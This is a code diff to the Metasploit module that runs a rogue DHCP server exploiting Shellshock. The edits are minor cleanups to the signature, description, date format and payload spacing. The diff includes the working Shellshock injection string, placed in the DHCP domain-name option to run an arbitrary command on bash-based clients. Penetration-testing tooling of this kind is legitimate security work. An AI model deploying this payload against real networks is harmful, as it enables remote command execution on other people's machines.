@@ -6,7 +6,7 @@
 class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::DHCPServer
 
-  def initialize
+  def initialize(info = {})
     super(
       'Name' => 'DHCP Client Bash Environment Variable Code Injection (Shellshock)',
       'Description' => %q{
@@ -23,7 +23,7 @@ class MetasploitModule < Msf::Auxiliary
       ],
       'License' => MSF_LICENSE,
       'Actions' => [
-        [ 'Service', 'Description' => 'Run malicious DHCP server' ]
+        [ 'Service', 'Description' => 'Run Shellshock DHCP server' ]
       ],
       'PassiveActions' => [
         'Service'
@@ -38,7 +38,7 @@ class MetasploitModule < Msf::Auxiliary
         [ 'URL', 'https://seclists.org/oss-sec/2014/q3/649' ],
         [ 'URL', 'https://www.trustedsec.com/september-2014/shellshock-dhcp-rce-proof-concept/' ]
       ],
-      'DisclosureDate' => 'Sep 24 2014',
+      'DisclosureDate' => '2014-09-24',
       'Notes' => {
         'AKA' => ['Shellshock']
       }
@@ -54,7 +54,7 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def run
-    value = "() { :; }; PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin #{datastore['CMD']}"
+    value = "() { :;};PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin #{datastore['CMD']}"
 
     start_service(datastore.merge({
       'DOMAINNAME' => value,
